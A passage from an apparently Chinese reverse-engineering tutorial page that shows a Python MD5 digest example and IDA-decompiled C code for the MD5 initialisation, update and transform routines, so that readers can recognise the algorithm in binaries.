class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"小写的32位 : "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>input_name<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"小写的16位 : "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>input_name<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>md5value<span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token triple-quoted-string string">''' 输出：大写的 32 位 MD5 : B2E8ED4649266019056425F0E67A62A7大写的 16 位 MD5 : 49266019056425F0小写的 32 位 MD5 : b2e8ed4649266019056425f0e67a62a7小写的 16 位 MD5 : 49266019056425f0'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="IDA-示例-5"><a href="#IDA-示例-5" class="headerlink" title="IDA 示例"></a>IDA 示例</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// MD5_Init</span>_DWORD <span class="token operator">*</span>__cdecl <span class="token function">sub_4012B0</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  _DWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  result <span class="token operator">=</span> a1<span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token operator">*</span>a1 <span class="token operator">=</span> <span class="token number">1732584193</span><span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">271733879</span><span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1732584194</span><span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">271733878</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// MD5_Update</span><span class="token keyword">int</span> __cdecl <span class="token function">sub_4012E0</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// ebp</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> a3<span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;</span> <span class="token number">8</span> <span class="token operator">*</span> a3 <span class="token punctuation">)</span>    <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">+=</span> a3 <span class="token operator">>></span> <span class="token number">29</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">64</span> <span class="token operator">-</span> v4<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a3 <span class="token operator">&lt;</span> <span class="token number">64</span> <span class="token operator">-</span> v4 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_401DF0</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">,</span> a2<span class="token punctuation">,</span> <span class="token number">64</span> <span class="token operator">-</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_401400</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a1 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v6 <span class="token operator">=</span> v5<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> v5 <span class="token operator">+</span> <span class="token number">63</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a3<span class="token punctuation">;</span> v6 <span class="token operator">+=</span> <span class="token number">64</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sub_401400</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2 <span class="token operator">+</span> i <span class="token operator">-</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      i <span class="token operator">+=</span> <span class="token number">64</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">sub_401DF0</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">,</span> a2 <span class="token operator">+</span> v6<span class="token punctuation">,</span> a3 <span class="token operator">-</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> __cdecl <span class="token function">sub_401400</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// ebp</span>  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment">// kr00_8</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> __int64 v8<span class="token punctuation">;</span> <span class="token comment">// kr08_8</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">int</span> v19<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v20<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v21<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v22<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v23<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v24<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v25<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v26<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">int</span> v27<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v28<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v29<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v30<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v31<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v32<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v33<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v34<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">int</span> v35<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v36<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v37<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v38<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v39<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v40<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v41<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v42<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">int</span> v43<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v44<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v45<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v46<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v47<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v48<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v49<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v50<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">int</span> v51<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v52<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v53<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v54<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v55<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v56<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v57<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v58<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v59<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v60<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v61<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v62<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v63<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v64<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v65<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v66<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v67<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v68<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v69<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v70<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v71<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v72<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v73<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v74<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v75<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v76<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v77<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v78<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v79<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v80<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v81<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v82<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v83<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v84<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v85<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">int</span> v86<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v87<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">int</span> v88<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v89<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v90<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v91<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v92<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v93<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v94<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v95<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">int</span> v96<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v97<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">int</span> v98<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v99<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v100<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v101<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v102<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v103<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v104<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v105<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">int</span> v106<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v107<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">int</span> v108<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v109<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v110<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">int</span> v111<span class="token punctuation">;</span> <span class="token comment">// ebp</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v112<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v113<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v114<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v115<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">int</span> v117<span class="token punctuation">;</span> <span class="token comment">// [esp+10h] [ebp-40h] BYREF</span>  <span class="token keyword">int</span> v118<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-3Ch]</span>  <span class="token keyword">int</span> v119<span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-38h]</span>  <span class="token keyword">int</span> v120<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-34h]</span>  <span class="token keyword">int</span> v121<span class="token punctuation">;</span> <span class="token comment">// [esp+20h] [ebp-30h]</span>  <span class="token keyword">int</span> v122<span class="token punctuation">;</span> <span class="token comment">// [esp+24h] [ebp-2Ch]</span>  <span class="token keyword">int</span> v123<span class="token punctuation">;</span> <span class="token comment">// [esp+28h] [ebp-28h]</span>  <span class="token keyword">int</span> v124<span class="token punctuation">;</span> <span class="token comment">// [esp+2Ch] [ebp-24h]</span>  <span class="token keyword">int</span> v125<span class="token punctuation">;</span> <span class="token comment">// [esp+30h] [ebp-20h]</span>  <span class="token keyword">int</span> v126<span class="token punctuation">;</span> <span class="token comment">// [esp+34h] [ebp-1Ch]</span>  <span class="token keyword">int</span> v127<span class="token punctuation">;</span> <span class="token comment">// [esp+38h] [ebp-18h]</span>  <span class="token keyword">int</span> v128<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-14h]</span>  <span class="token keyword">int</span> v129<span class="token punctuation">;</span> <span class="token comment">// [esp+40h] [ebp-10h]</span>  <span class="token keyword">int</span> v130<span class="token punctuation">;</span> <span class="token comment">// [esp+44h] [ebp-Ch]</span>  <span class="token keyword">int</span> v131<span class="token punctuation">;</span> <span class="token comment">// [esp+48h] [ebp-8h]</span>  <span class="token keyword">int</span> v132<span class="token punctuation">;</span> <span class="token comment">// [esp+4Ch] [ebp-4h]</span>  <span class="token keyword">int</span> v133<span class="token punctuation">;</span> <span class="token comment">// [esp+54h] [ebp+4h]</span>  <span class="token keyword">int</span> v134<span class="token punctuation">;</span> <span class="token comment">// [esp+54h] [ebp+4h]</span>  <span class="token keyword">int</span> v135<span class="token punctuation">;</span> <span class="token comment">// [esp+54h] [ebp+4h]</span>  <span class="token keyword">int</span> v136<span class="token punctuation">;</span> <span class="token comment">// [esp+54h] [ebp+4h]</span>  <span class="token keyword">int</span> v137<span class="token punctuation">;</span> <span class="token comment">// [esp+54h] [ebp+4h]</span>  <span class="token keyword">int</span> v138<span class="token punctuation">;</span> <span class="token comment">// [esp+54h] [ebp+4h]</span>  <span class="token keyword">int</span> v139<span class="token punctuation">;</span> <span class="token comment">// [esp+54h] [ebp+4h]</span>  <span class="token keyword">int</span> v140<span class="token punctuation">;</span> <span class="token comment">// [esp+54h] [ebp+4h]</span>  v3 <span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  v133 <span class="token operator">=</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span>  <span class="token function">sub_401DA0</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v117<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token punctuation">(</span>v133 <span class="token operator">+</span> v117 <span class="token operator">+</span> <span class="token punctuation">(</span>v3 <span class="token operator">&amp;</span> v4 <span class="token operator">|</span> v5 <span class="token operator">&amp;</span> <span class="token operator">~</span>v3<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">680876936</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> v3 <span class="token operator">+</span> <span class="token punctuation">(</span>v6 <span class="token operator">|</span> <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> <span class="token punctuation">(</span>v118 <span class="token operator">+</span> <span class="token punctuation">(</span>v7 <span class="token operator">&amp;</span> v3 <span class="token operator">|</span> v4 <span class="token operator">&amp;</span> <span class="token operator">~</span>v7<span class="token punctuation">)</span> <span class="token operator">+</span> v5 <span class="token operator">-</span> <span class="token number">389564586</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> v7 <span class="token operator">+</span> <span class="token punctuation">(</span>v8 <span class="token operator">|</span> <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v10 <span class="token operator">=</span> v4 <span class="token operator">+</span> v119 <span class="token operator">+</span> <span class="token punctuation">(</span>v7 <span class="token operator">&amp;</span> v9 <span class="token operator">|</span> v3 <span class="token operator">&amp;</span> <span class="token operator">~</span>v9<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">606105819</span><span class="token punctuation">;</span>  v11 <span class="token operator">=</span> v9 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v10 <span class="token operator">&lt;&lt;</span> <span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v10 <span class="token operator">>></span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v134 <span class="token operator">=</span> v11       <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> v120 <span class="token operator">+</span> <span class="token punctuation">(</span>v11 <span class="token operator">&amp;</span> v9 <span class="token operator">|</span> v7 <span class="token operator">&amp;</span> <span class="token operator">~</span>v11<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1044525330</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> v120 <span class="token operator">+</span> <span class="token punctuation">(</span>v11 <span class="token operator">&amp;</span> v9 <span class="token operator">|</span> v7 <span class="token operator">&amp;</span> <span class="token operator">~</span>v11<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1044525330</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v12 <span class="token operator">=</span> v121 <span class="token operator">+</span> <span class="token punctuation">(</span>v134 <span class="token operator">&amp;</span> v11 <span class="token operator">|</span> v9 <span class="token operator">&amp;</span> <span class="token operator">~</span>v134<span class="token punctuation">)</span><span class="token punctuation">;</span>  v13 <span class="token operator">=</span> v134 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v7 <span class="token operator">+</span> v12 <span class="token operator">-</span> <span class="token number">176418897</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v7 <span class="token operator">+</span> v12 <span class="token operator">-</span> <span class="token number">176418897</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v14 <span class="token operator">=</span> v9 <span class="token operator">+</span> v122 <span class="token operator">+</span> <span class="token punctuation">(</span>v13 <span class="token operator">&amp;</span> v134 <span class="token operator">|</span> v11 <span class="token operator">&amp;</span> <span class="token operator">~</span>v13<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1200080426</span><span class="token punctuation">;</span>  v15 <span class="token operator">=</span> v13 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v14 <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v14 <span class="token operator">>></span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v16 <span class="token operator">=</span> v11 <span class="token operator">+</span> v123 <span class="token operator">+</span> <span class="token punctuation">(</span>v13 <span class="token operator">&amp;</span> v15 <span class="token operator">|</span> v134 <span class="token operator">&amp;</span> <span class="token operator">~</span>v15<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1473231341</span><span class="token punctuation">;</span>  v17 <span class="token operator">=</span> v15 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v16 <span class="token operator">&lt;&lt;</span> <span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>v16 <span class="token operator">>></span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v135 <span class="token operator">=</span> v17       <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v134 <span class="token operator">+</span> v124 <span class="token operator">+</span> <span class="token punctuation">(</span>v17 <span class="token operator">&amp;</span> v15 <span class="token operator">|</span> v13 <span class="token operator">&amp;</span> <span class="token operator">~</span>v17<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">45705983</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v134                                                                        <span class="token operator">+</span> v124                                                                        <span class="token operator">+</span> <span class="token 